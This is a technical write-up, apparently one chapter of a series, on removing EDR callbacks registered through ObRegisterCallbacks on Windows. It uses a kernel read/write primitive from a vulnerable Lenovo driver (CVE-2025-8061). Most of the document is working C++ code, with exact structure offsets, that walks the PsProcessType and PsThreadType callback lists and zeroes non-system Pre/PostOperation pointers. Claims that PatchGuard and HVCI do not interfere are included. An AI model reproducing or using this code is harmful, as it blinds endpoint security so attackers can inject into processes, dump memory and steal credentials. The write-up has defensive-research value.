# 10 — ObRegisterCallbacks Removal (Object Type Callback List)

**File:** `10_ob_callback.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Kernel VA read/write (via VaToPa + PhysR/W)  
**Output:** EDR can no longer strip access rights from OpenProcess/OpenThread

---

## Objective

Zero the `PreOperation` and `PostOperation` callback pointers in the `_OB_CALLBACK_ENTRY` chain of `PsProcessType` and `PsThreadType`. Result: when any process calls `OpenProcess(PROCESS_ALL_ACCESS, ...)`, the EDR can no longer intercept and strip rights — the caller receives a handle with the full set of requested rights.

---

## Background Theory

### How does ObRegisterCallbacks work?

EDR/AV products call `ObRegisterCallbacks(OB_CALLBACK_REGISTRATION, ...)` to register hooks on object operations. The two most important object types:

- **PsProcessType**: intercepts OpenProcess, DuplicateHandle targeting processes
- **PsThreadType**: intercepts OpenThread targeting threads

When a process calls `OpenProcess`:
```
User: OpenProcess(PROCESS_ALL_ACCESS, pid=1234)
  → kernel: ObpCallPreOperationCallbacks()
      → EDR PreOperation callback: strips PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD
  → caller receives handle with rights {0x1000} instead of {0x1FFFFF}
```

EDR uses this to prevent process injection, memory dumping, and credential theft.

### _OB_CALLBACK_ENTRY layout

```
struct _OB_CALLBACK_ENTRY {
    +0x00  CallbackList   LIST_ENTRY     ← linked into OBJECT_TYPE.CallbackList
    +0x10  Operations     OB_OPERATION   (1=HANDLE_CREATE, 2=HANDLE_DUPLICATE)
    +0x18  Enabled        BOOLEAN        ← can be set FALSE to disable
    +0x20  ObjectType     POBJECT_TYPE   ← PsProcessType or PsThreadType
    +0x28  PreOperation   fn ptr         ← THIS IS WHAT WE ZERO
    +0x30  PostOperation  fn ptr         ← THIS IS WHAT WE ZERO
};
```

### OBJECT_TYPE.CallbackList

```
OBJECT_TYPE:
    +0x000  TypeList       LIST_ENTRY   (chain between object types)
    +0x010  Name           UNICODE_STRING
    +0x028  DefaultObject  PVOID
    +0x030  Index          UCHAR
    ...
    +0x0C8  CallbackList   LIST_ENTRY   ← HEAD of the _OB_CALLBACK_ENTRY chain
```

`PsProcessType` and `PsThreadType` are exported symbols in ntoskrnl, but they are **POBJECT_TYPE\*** — pointer to pointer. We must dereference once to get the OBJECT_TYPE VA.

### Why doesn't PatchGuard check this?

This callback chain is **data-only**. PatchGuard does not protect it. APT groups such as AvosLocker (2022–2023) and RealBlindingEDR both use this technique.

---

## Code Walkthrough

### Struct layout constants

```cpp
#define OBJECT_TYPE_CALLBACKLIST_OFFSET  0x0C8
// Verified with WinDbg: dt nt!_OBJECT_TYPE → CallbackList at +0x0C8 on Win10 19041–Win11 26100

#define OBCB_CallbackList   0x00   // LIST_ENTRY (Flink, Blink) = 16 bytes
#define OBCB_Operations     0x10   // OB_OPERATION (ULONG)
#define OBCB_Enabled        0x18   // BOOLEAN
#define OBCB_ObjectType     0x20   // POBJECT_TYPE (8 bytes)
#define OBCB_PreOperation   0x28   // callback fn ptr (8 bytes)
#define OBCB_PostOperation  0x30   // callback fn ptr (8 bytes)
```

Stable offsets — unchanged from Win10 1903 through Win11 26100.

### ObEntry struct

```cpp
struct ObEntry {
    uint64_t node_va;    // VA of the _OB_CALLBACK_ENTRY node
    uint64_t orig_pre;   // original PreOperation fn ptr (for restore)
    uint64_t orig_post;  // original PostOperation fn ptr (for restore)
    bool     had_pre;    // did we successfully zero PreOperation?
    bool     had_post;   // did we successfully zero PostOperation?
};
static ObEntry g_saved[MAX_OB_ENTRIES];  // MAX_OB_ENTRIES = 64
static int     g_saved_count = 0;
```

Saves state for restoration after the demo completes.

### WalkObCallbackList() — step 1: dereference PsProcessType

```cpp
static void WalkObCallbackList(uint64_t cr3,
                                uint64_t type_ptr_va,  // VA of the PsProcessType variable
                                const char *type_name,
                                uint64_t ntos_base, uint64_t ntos_size,
                                bool do_zero)
{
    // PsProcessType is POBJECT_TYPE* — a pointer to a pointer
    // GetNtExport("PsProcessType") returns the VA of the PsProcessType variable in ntoskrnl .data
    // We must read 8 bytes there to obtain the actual OBJECT_TYPE VA
    uint64_t obj_type_va = 0;
    if (!KernelReadU64(cr3, type_ptr_va, &obj_type_va) || !obj_type_va) {
        printf("    [-] Could not read %s pointer\n", type_name);
        return;
    }
    printf("    [*] %s OBJECT_TYPE @ 0x%016llX\n", type_name, obj_type_va);
```

Key point: the export `PsProcessType` is NOT an OBJECT_TYPE*, it is a **pointer to an OBJECT_TYPE***. We read the address stored there to get the actual address.

### Step 2: read the CallbackList LIST_ENTRY head

```cpp
    uint64_t list_head_va = obj_type_va + OBJECT_TYPE_CALLBACKLIST_OFFSET;
    // = obj_type_va + 0x0C8: this is the LIST_ENTRY head (Flink, Blink)
    
    uint64_t flink = 0, blink = 0;
    if (!KernelReadU64(cr3, list_head_va,     &flink) ||
        !KernelReadU64(cr3, list_head_va + 8, &blink)) {
        return;
    }

    if (flink == list_head_va) {
        printf("    [~] %s: callback list empty\n", type_name);
        return;
    }
    // If Flink points back to list_head_va → list is empty (circular list with 0 nodes)
```

### Step 3: walk the linked list

```cpp
    uint64_t cur = flink;  // start from the first node
    int count = 0;
    while (cur != list_head_va && count < 256) {
        // cur is the VA of _OB_CALLBACK_ENTRY.CallbackList (i.e., +0x00 of the struct)
        // Since CallbackList is the first field (+0x00), cur also equals the VA of the full struct
        uint64_t node_va = cur;
        
        uint64_t pre_va  = node_va + OBCB_PreOperation;   // +0x28
        uint64_t post_va = node_va + OBCB_PostOperation;  // +0x30
        uint64_t otype_va = node_va + OBCB_ObjectType;    // +0x20
        
        uint64_t pre_fn = 0, post_fn = 0, registered_type = 0;
        KernelReadU64(cr3, pre_va,   &pre_fn);    // read fn ptr
        KernelReadU64(cr3, post_va,  &post_fn);   // read fn ptr
        KernelReadU64(cr3, otype_va, &registered_type);
```

### Step 4: classify callback — system vs EDR

```cpp
        // Check whether the fn ptr lies within ntoskrnl → system callback, skip
        bool pre_is_system  = (pre_fn  >= ntos_base && pre_fn  < ntos_base + ntos_size);
        bool post_is_system = (post_fn >= ntos_base && post_fn < ntos_base + ntos_size);

        printf("      [%02d] node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
               count, node_va,
               pre_fn,  pre_is_system  ? " [sys]" : "",
               post_fn, post_is_system ? " [sys]" : "");
```

Filtering system callbacks: if a fn ptr falls within the ntoskrnl address range → this is a kernel-internal callback (e.g., kernel-internal process monitoring). We do not touch these to avoid kernel panic.

### Step 5: zero non-system callbacks

```cpp
        if (do_zero && g_saved_count < MAX_OB_ENTRIES) {
            ObEntry &e = g_saved[g_saved_count];
            e.node_va   = node_va;
            e.orig_pre  = pre_fn;
            e.orig_post = post_fn;
            e.had_pre   = e.had_post = false;

            // Zero PreOperation if it is not a system callback
            if (pre_fn && !pre_is_system) {
                if (KernelWriteU64(cr3, pre_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, pre_va, &rb);  // readback verify
                    if (rb == 0) {
                        e.had_pre = true;
                        printf("        zeroed PreOperation\n");
                    } else {
                        printf("        [!] PreOperation write didn't stick (HVCI?)\n");
                    }
                }
            }
            
            // Same for PostOperation
            if (post_fn && !post_is_system) {
                if (KernelWriteU64(cr3, post_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, post_va, &rb);
                    if (rb == 0) {
                        e.had_post = true;
                        printf("        zeroed PostOperation\n");
                    }
                }
            }
            
            if (e.had_pre || e.had_post) g_saved_count++;
        }
```

`KernelWriteU64` internally calls `VaToPa(cr3, va)` to get the PA, then `PhysWriteU64(pa, val)`.

### Step 6: advance through the list

```cpp
        // Read the Flink of the current node to advance
        uint64_t next = 0;
        if (!KernelReadU64(cr3, cur, &next) || next == cur) break;
        // cur + 0 = the Flink field of the LIST_ENTRY (= start of _OB_CALLBACK_ENTRY)
        cur = next;
        count++;
    }
```

`cur` points to `_OB_CALLBACK_ENTRY.CallbackList.Flink`, so reading at `cur` gives us the Flink of the current node = VA of the next node.

### Two phases: dry-run first, then zero

```cpp
// Phase 1 — dry run: enumerate but do not zero
WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                   nt.base, ntos_size, false);   // do_zero=false
WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                   nt.base, ntos_size, false);

printf("[*] Press Enter to ZERO all non-system ObRegisterCallbacks...\n");
getchar();  // User reviews before destructive action

// Phase 2 — actually zero
WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                   nt.base, ntos_size, true);    // do_zero=true
WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                   nt.base, ntos_size, true);
```

Two-phase design: the user sees the list of callbacks first, confirms, then zeroing occurs. Reduces the risk of accidentally zeroing the wrong entries.

### RestoreAll()

```cpp
static void RestoreAll(uint64_t cr3)
{
    int restored = 0;
    for (int i = 0; i < g_saved_count; i++) {
        ObEntry &e = g_saved[i];
        // Restore PreOperation
        if (e.had_pre)
            if (KernelWriteU64(cr3, e.node_va + OBCB_PreOperation, e.orig_pre))
                restored++;
        // Restore PostOperation
        if (e.had_post)
            if (KernelWriteU64(cr3, e.node_va + OBCB_PostOperation, e.orig_post))
                restored++;
    }
    printf("[+] Restored %d callback pointers\n", restored);
}
```

Restores each fn ptr to its original value. After restoration, the EDR receives callbacks normally again.

---

## Expected Output

```
[*] Phase 1 — enumerating callbacks (dry run):
    [*] PsProcessType OBJECT_TYPE @ 0xFFFFCA80`12345000
      [00] node=0xFFFFCA80`ABCD0000  pre=0xFFFF8001`DEF01234  post=0x0000000000000000
      [01] node=0xFFFFCA80`ABCD0080  pre=0xFFFF8001`99887766 [sys]  post=0xFFFF8001`AABBCCDD

    [*] PsThreadType OBJECT_TYPE @ 0xFFFFCA80`12346000
      [00] node=0xFFFFCA80`ABCE0000  pre=0xFFFF8001`DEF01234  post=0x0000000000000000

[*] Press Enter to ZERO all non-system ObRegisterCallbacks...

[*] Phase 2 — zeroing callbacks:
      [00] zeroed PreOperation
      [01] (skipped — system)

[+] 1 callback entries zeroed
[+] OpenProcess(PROCESS_ALL_ACCESS, ...) will no longer be intercepted
[+] EDR cannot strip VM read/write/injection rights from handles
```

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | **Not checked** — data-only callback chain |
| HVCI | Not affected — .data is not protected by the hypervisor |
| EDR self-repair | Some EDRs re-register when they detect that a callback was removed (EDR-dependent) |
| System callback | Code skips callbacks within the ntoskrnl range → kernel remains stable |

---

## Flow Summary

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .text/.data bounds

GetNtExport("PsProcessType") → type_ptr_va
GetNtExport("PsThreadType")  → type_ptr_va

For each type:
    KernelReadU64(type_ptr_va) → obj_type_va
    list_head = obj_type_va + 0x0C8

    Phase 1 (dry run):
        Walk LIST_ENTRY chain → print each node's Pre/Post fn ptrs
    
    [User confirms]
    
    Phase 2 (zero):
        For each non-system node:
            KernelWriteU64(node + 0x28, 0)  ← zero PreOperation
            KernelWriteU64(node + 0x30, 0)  ← zero PostOperation
            Save originals for restore

[+] OpenProcess no longer intercepted by EDR

[Press Enter]

RestoreAll():
    For each saved entry:
        KernelWriteU64(node + 0x28, orig_pre)
        KernelWriteU64(node + 0x30, orig_post)
```
